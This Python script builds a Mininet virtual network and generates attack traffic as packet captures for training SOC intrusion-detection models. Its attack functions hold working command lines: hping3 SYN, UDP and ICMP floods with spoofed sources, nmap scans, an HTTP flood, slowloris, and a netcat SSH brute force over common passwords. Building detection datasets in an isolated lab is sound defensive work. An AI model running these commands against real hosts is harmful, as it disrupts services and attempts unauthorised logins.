#!/usr/bin/env python3
"""
Mininet Attack Traffic Generation
Simulates various network attacks for SOC training data
"""

import os
import sys
import time
import random
import subprocess
from datetime import datetime
from mininet.net import Mininet
from mininet.node import Controller, OVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink

class AttackTrafficGenerator:
    """Generate attack network traffic in Mininet"""
    
    def __init__(self, output_dir='../data_capture/pcaps'):
        self.output_dir = output_dir
        self.net = None
        self.capture_process = None
        os.makedirs(output_dir, exist_ok=True)
        
    def create_topology(self):
        """Create network topology for attack simulation"""
        info('*** Creating attack simulation topology\n')
        
        self.net = Mininet(
            switch=OVSSwitch,
            link=TCLink,
            autoSetMacs=True,
            autoStaticArp=True,
            controller=None  # Don't require controller for simple traffic generation
        )
        
        # Add switches
        s1 = self.net.addSwitch('s1')
        s2 = self.net.addSwitch('s2')
        
        # Add victim hosts
        victim1 = self.net.addHost('victim1', ip='10.0.1.10/24')
        victim2 = self.net.addHost('victim2', ip='10.0.1.11/24')
        victim3 = self.net.addHost('victim3', ip='10.0.1.12/24')
        
        # Add attacker hosts
        attacker1 = self.net.addHost('attacker1', ip='10.0.2.100/24')
        attacker2 = self.net.addHost('attacker2', ip='10.0.2.101/24')
        attacker3 = self.net.addHost('attacker3', ip='10.0.2.102/24')
        
        # Add normal hosts for background traffic
        normal1 = self.net.addHost('normal1', ip='10.0.3.1/24')
        normal2 = self.net.addHost('normal2', ip='10.0.3.2/24')
        
        # Create links
        self.net.addLink(victim1, s1, bw=100)
        self.net.addLink(victim2, s1, bw=100)
        self.net.addLink(victim3, s1, bw=100)
        
        self.net.addLink(attacker1, s2, bw=100)
        self.net.addLink(attacker2, s2, bw=100)
        self.net.addLink(attacker3, s2, bw=100)
        
        self.net.addLink(normal1, s1, bw=10)
        self.net.addLink(normal2, s1, bw=10)
        
        self.net.addLink(s1, s2, bw=1000)
        
        return self.net
    
    def start_packet_capture(self, attack_type, duration=120):
        """Start tcpdump packet capture for attack"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        pcap_file = os.path.join(
            self.output_dir, 
            f'attack_{attack_type}_{timestamp}.pcap'
        )
        
        info(f'*** Starting packet capture: {pcap_file}\n')
        
        cmd = [
            'tcpdump',
            '-i', 'any',
            '-w', pcap_file,
            '-G', str(duration),
            '-W', '1',
            'not arp and not stp'
        ]
        
        self.capture_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        return pcap_file
    
    def stop_packet_capture(self):
        """Stop packet capture"""
        if self.capture_process:
            info('*** Stopping packet capture\n')
            self.capture_process.terminate()
            self.capture_process.wait()
            self.capture_process = None
    
    def attack_syn_flood(self, attacker, victim, duration=60, rate=1000):
        """
        SYN Flood DDoS Attack
        Floods victim with SYN packets without completing handshake
        """
        info(f'*** SYN Flood Attack: {attacker.name} -> {victim.name}\n')
        info(f'*** Rate: {rate} packets/sec, Duration: {duration}s\n')
        
        # Using hping3 for SYN flood
        # -S: SYN flag, -p: port, --flood: send as fast as possible
        # --rand-source: randomize source IP
        cmd = (
            f'timeout {duration} '
            f'hping3 -S -p 80 --flood --rand-source {victim.IP()} '
            f'> /dev/null 2>&1 &'
        )
        
        attacker.cmd(cmd)
        time.sleep(duration)
    
    def attack_port_scan(self, attacker, victim, scan_type='syn'):
        """
        Port Scanning Attack
        Scans victim for open ports
        """
        info(f'*** Port Scan Attack: {attacker.name} -> {victim.name}\n')
        info(f'*** Scan type: {scan_type}\n')
        
        if scan_type == 'syn':
            # SYN scan (stealthy)
            cmd = f'nmap -sS -p 1-1000 {victim.IP()} > /dev/null 2>&1 &'
        elif scan_type == 'connect':
            # TCP connect scan
            cmd = f'nmap -sT -p 1-1000 {victim.IP()} > /dev/null 2>&1 &'
        elif scan_type == 'udp':
            # UDP scan
            cmd = f'nmap -sU -p 1-500 {victim.IP()} > /dev/null 2>&1 &'
        else:
            # Full scan
            cmd = f'nmap -p 1-1000 {victim.IP()} > /dev/null 2>&1 &'
        
        attacker.cmd(cmd)
        time.sleep(30)  # Wait for scan to complete
    
    def attack_udp_flood(self, attacker, victim, duration=60):
        """
        UDP Flood Attack
        Floods victim with UDP packets
        """
        info(f'*** UDP Flood Attack: {attacker.name} -> {victim.name}\n')
        
        # Using hping3 for UDP flood
        cmd = (
            f'timeout {duration} '
            f'hping3 --udp -p 53 --flood --rand-source {victim.IP()} '
            f'> /dev/null 2>&1 &'
        )
        
        attacker.cmd(cmd)
        time.sleep(duration)
    
    def attack_icmp_flood(self, attacker, victim, duration=60):
        """
        ICMP Flood (Ping Flood) Attack
        Floods victim with ICMP echo requests
        """
        info(f'*** ICMP Flood Attack: {attacker.name} -> {victim.name}\n')
        
        # Using hping3 for ICMP flood
        cmd = (
            f'timeout {duration} '
            f'hping3 --icmp --flood {victim.IP()} '
            f'> /dev/null 2>&1 &'
        )
        
        attacker.cmd(cmd)
        time.sleep(duration)
    
    def attack_http_flood(self, attacker, victim, duration=60):
        """
        HTTP Flood Attack (Application Layer DDoS)
        Floods web server with HTTP requests
        """
        info(f'*** HTTP Flood Attack: {attacker.name} -> {victim.name}\n')
        
        # Start HTTP server on victim
        victim.cmd('python3 -m http.server 80 > /dev/null 2>&1 &')
        time.sleep(2)
        
        # Flood with HTTP requests
        for i in range(duration * 10):  # 10 requests per second
            attacker.cmd(f'curl -s http://{victim.IP()}/ > /dev/null &')
            time.sleep(0.1)
        
        # Stop HTTP server
        victim.cmd('pkill -f "http.server"')
    
    def attack_dns_amplification(self, attacker, victim, duration=60):
        """
        DNS Amplification Attack
        Uses DNS servers to amplify attack traffic
        """
        info(f'*** DNS Amplification Attack: {attacker.name} -> {victim.name}\n')
        
        # Simulate DNS amplification using UDP flood to port 53
        cmd = (
            f'timeout {duration} '
            f'hping3 --udp -p 53 --flood --rand-source {victim.IP()} '
            f'> /dev/null 2>&1 &'
        )
        
        attacker.cmd(cmd)
        time.sleep(duration)
    
    def attack_brute_force_ssh(self, attacker, victim, duration=60):
        """
        SSH Brute Force Attack
        Attempts multiple SSH login attempts
        """
        info(f'*** SSH Brute Force Attack: {attacker.name} -> {victim.name}\n')
        
        # Start SSH-like service on victim
        victim.cmd('nc -l -p 22 > /dev/null 2>&1 &')
        time.sleep(1)
        
        # Simulate brute force attempts
        passwords = ['admin', 'password', '123456', 'root', 'test']
        for i in range(duration // 2):
            for pwd in passwords:
                attacker.cmd(f'echo "{pwd}" | nc -w 1 {victim.IP()} 22 > /dev/null 2>&1 &')
                time.sleep(0.2)
        
        victim.cmd('pkill nc')
    
    def attack_slowloris(self, attacker, victim, duration=60):
        """
        Slowloris Attack
        Keeps many connections open to exhaust server resources
        """
        info(f'*** Slowloris Attack: {attacker.name} -> {victim.name}\n')
        
        # Start HTTP server on victim
        victim.cmd('python3 -m http.server 80 > /dev/null 2>&1 &')
        time.sleep(2)
        
        # Open many slow connections
        for i in range(100):
            attacker.cmd(f'(echo "GET / HTTP/1.1\nHost: {victim.IP()}\n"; sleep {duration}) | nc {victim.IP()} 80 > /dev/null 2>&1 &')
            time.sleep(0.5)
        
        time.sleep(duration)
        victim.cmd('pkill -f "http.server"')
    
    def generate_background_traffic(self, host1, host2, duration=60):
        """Generate normal background traffic during attacks"""
        # Simple ping and HTTP traffic
        host2.cmd('python3 -m http.server 8080 > /dev/null 2>&1 &')
        time.sleep(1)
        
        for i in range(duration // 5):
            host1.cmd(f'ping -c 2 {host2.IP()} > /dev/null 2>&1 &')
            host1.cmd(f'curl -s http://{host2.IP()}:8080/ > /dev/null 2>&1 &')
            time.sleep(5)
        
        host2.cmd('pkill -f "http.server"')
    
    def run_attack_simulation(self, attack_type='all', duration=120):
        """Run attack simulation"""
        info(f'*** Starting attack simulation: {attack_type}\n')
        
        # Start network
        self.net.start()
        time.sleep(5)
        
        # Get hosts
        victim1, victim2, victim3 = self.net.get('victim1', 'victim2', 'victim3')
        attacker1, attacker2, attacker3 = self.net.get('attacker1', 'attacker2', 'attacker3')
        normal1, normal2 = self.net.get('normal1', 'normal2')
        
        # Start packet capture
        pcap_file = self.start_packet_capture(attack_type, duration + 10)
        
        # Start background traffic
        import threading
        bg_thread = threading.Thread(
            target=self.generate_background_traffic,
            args=(normal1, normal2, duration)
        )
        bg_thread.start()
        
        # Execute attacks based on type
        if attack_type == 'syn_flood' or attack_type == 'all':
            self.attack_syn_flood(attacker1, victim1, duration=min(60, duration))
        
        if attack_type == 'port_scan' or attack_type == 'all':
            self.attack_port_scan(attacker2, victim2, scan_type='syn')
            time.sleep(5)
            self.attack_port_scan(attacker2, victim3, scan_type='connect')
        
        if attack_type == 'udp_flood' or attack_type == 'all':
            self.attack_udp_flood(attacker3, victim1, duration=min(60, duration))
        
        if attack_type == 'icmp_flood' or attack_type == 'all':
            self.attack_icmp_flood(attacker1, victim2, duration=min(30, duration))
        
        if attack_type == 'http_flood' or attack_type == 'all':
            self.attack_http_flood(attacker2, victim3, duration=min(60, duration))
        
        if attack_type == 'dns_amplification' or attack_type == 'all':
            self.attack_dns_amplification(attacker3, victim1, duration=min(30, duration))
        
        if attack_type == 'brute_force' or attack_type == 'all':
            self.attack_brute_force_ssh(attacker1, victim3, duration=min(60, duration))
        
        if attack_type == 'slowloris' or attack_type == 'all':
            self.attack_slowloris(attacker2, victim1, duration=min(60, duration))
        
        # Wait for background traffic to complete
        bg_thread.join()
        
        # Wait for capture to finish
        time.sleep(5)
        
        # Stop packet capture
        self.stop_packet_capture()
        
        info(f'*** Attack simulation completed\n')
        info(f'*** Packet capture saved to: {pcap_file}\n')
        
        return pcap_file
    
    def cleanup(self):
        """Cleanup network"""
        if self.net:
            info('*** Stopping network\n')
            self.net.stop()

def main():
    """Main function"""
    setLogLevel('info')
    
    print("="*60)
    print("MININET ATTACK TRAFFIC GENERATION")
    print("="*60)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("ERROR: This script must be run as root (use sudo)")
        sys.exit(1)
    
    # Check for required tools
    required_tools = ['hping3', 'nmap', 'nc']
    missing_tools = []
    for tool in required_tools:
        if subprocess.call(['which', tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"ERROR: Missing required tools: {', '.join(missing_tools)}")
        print("Install with: sudo apt-get install hping3 nmap netcat")
        sys.exit(1)
    
    # Parse command line arguments
    attack_types = ['syn_flood', 'port_scan', 'udp_flood', 'icmp_flood', 
                   'http_flood', 'dns_amplification', 'brute_force', 'slowloris', 'all']
    
    attack_type = 'all'
    if len(sys.argv) > 1:
        if sys.argv[1] in attack_types:
            attack_type = sys.argv[1]
        else:
            print(f"Invalid attack type. Choose from: {', '.join(attack_types)}")
            sys.exit(1)
    
    print(f"Attack type: {attack_type}")
    print("="*60)
    
    # Create attack generator
    generator = AttackTrafficGenerator()
    
    try:
        # Create topology
        generator.create_topology()
        
        # Run attack simulation
        pcap_file = generator.run_attack_simulation(attack_type=attack_type, duration=120)
        
        print("\n" + "="*60)
        print("ATTACK TRAFFIC GENERATION COMPLETED")
        print("="*60)
        print(f"Packet capture: {pcap_file}")
        print("\nNext steps:")
        print("1. Preprocess data: python ../data_capture/preprocess_pcap.py")
        print("2. Train models: python ../models/train_mininet_models.py")
        print("="*60)
        
    except KeyboardInterrupt:
        print("\n*** Interrupted by user")
    except Exception as e:
        print(f"\n*** Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        generator.cleanup()

if __name__ == '__main__':
    main()
